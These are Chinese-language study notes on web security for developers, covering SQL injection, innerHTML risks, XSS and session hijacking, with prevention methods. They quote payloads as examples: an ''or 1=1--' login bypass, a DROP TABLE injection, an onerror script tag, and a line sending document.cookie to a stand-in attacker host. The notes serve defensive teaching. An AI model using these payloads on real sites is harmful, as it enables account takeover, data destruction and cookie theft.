# security

1. 一些網路傷害：
   1. password leak
   2. database compromised
   3. data breaches
   4. viruses
   5. hacker attacks
2. 概念：
   1. security是防禦的概念，就像守門員，不會帶給公司成長，很少人看得到。
   2. senior developer要知道，security的重要性：
      1. 公司不會造成具大的損失
      2. 讓系統穩定
   3. security是不可能100%的防禦，駭客技術也一直不斷進步，但是要超越80%網站的安全性並不難，做到一些原則就很可能達到，這是這個section的目的。
3. 所有議題：
   1. injections
   2. authentication
   3. don't trust anyone
   4. data management
   5. access control
   6. secure headers
   7. code secrets
   8. xss and csrf
   9. https everywhere
   10. logging
   11. 3rd party libraries

## injections

1. 最常見，最重要
2. 意思是**把一段code注入另一段code**，我們從別的地方收到一段我不想要的code，卻改變了或是搞爛了我們自己的code。
3. 最有名的就是sql injection，例如：
   1. `'or 1=1--`
      1. 通常用於密碼欄
      2. [參考資料](https://www.gushiciku.cn/pl/pXfm/zh-tw)
         1. 資料庫原本該收到的是這樣`Select * From 使用者表 Where UserName=xxx and Password=xxx`，加了這行之後變成`Select * From 使用者表 Where UserName=xxx and Password=xxx or 1=1--`
         2. 也就是不管where和or之間的條件成不成立，`1=1`都會成立，所以使用者table裡的所有資料都會被回傳。
         3. 而後端設計通常是有收到回傳，代表登入成功，所以用這種injection進密碼就可以登入網站了。
      3. `--`代表後面的sql指令都comment掉了。
   2. `'; DROP TABLE users; --`
4. injection練習：
   1. 建立一個table
   2. injection的sql

      ```sql
      INSERT INTO sqlinjection(email) VALUES (''; DROP TABLE sqlinjection; --);
      ```

   3. 上面的意思是
      1. 把email這個column輸入成empty，`''`可以刪除，injection仍然有效。
      2. `;`代表前面結束了。
      3. 然後下面開始新的指令`DROP TABLE`，用來把sqlinjection這個table刪除，`;`代表前面指令結束了。
      4. `--`代表把後面的指令全部comment掉，不執行了。
      5. 之所以可行是因為第二個`'`讓sql的value的字串結束了，而`;`讓sql的命令結束了，所以後面就可以再加上sql的指令了。
   4. 網路上一堆人一天到晚在嚐試在email或是某些欄位貼上這種字串，看能不能injection成功。
   5. `.innerHTML`很危險
      1. 雖然他不會直接讓`<script></script>`執行，因為他設定成html已經執行了，裡面的javascript不會被執行，除非你reload。
      2. 但是比較聰明的injection會把javascript包在error handler裡面，例如：`<img src='/' onerror="alert('you are injected')">`，所以`.innerHtml`非常危險。
      3. 解決方式是用以下兩個步驟：
         1. 先用`document.createTextNode();`建立node。
         2. 再用`.appendChild()`，把node放進要放的地方。
5. 預防方式：
   1. 上面那種方式稱為sanitize input。
      1. 另外還可以限制輸入的格式，例如限制數字什麼的，也會比較安全。
      2. 可以設計black list，把危險的input擋掉。
      3. 可以設計white list，只讓安全的input可以輸入。
   2. parametrize queries。
      1. 預先寫好的function，把input拿到資料，當成一個一個的arameter放進function裡，function自己會用這些對應的parameter去跟資料庫溝通。
      2. 又稱為object relational mappers，不會有drop table這種statement被傳進去。
      3. 例如：Knex.js就是用這種方法。
   3. 不管前、後端永遠不要直接把input之接inject到任何地方。
6. 練習：
   1. [sql injection](https://www.hacksplaining.com/exercises/sql-injection)
   2. [Front End Code](https://github.com/aneagoie/security-client-exercise)
   3. [Back End Code](https://github.com/aneagoie/security-server-exercise)
7. XSS：
   1. 讓其它browser執行危險的javascript，方法是把javascript注入input中，顯現在文章中，其它client讀了文章就中獎。
   2. 最有名的就是`window.location = 'haxxed.com?cookie=' + document.cookie`，`haxxed.com`是某個壞網站。
   3. cookie：
      1. server會丟給client，client會存在browser裡。
      2. server可以認browser的cookie，就直接讓他登入，而不用再輸入帳號和密碼了。
      3. 所以cookie不能亂給別人，而上面的XSS就會把cookie給別人，讓別人可以登入你的帳號，這稱為**session hijack**。
      4. 預防方式依然是`sanitizing input`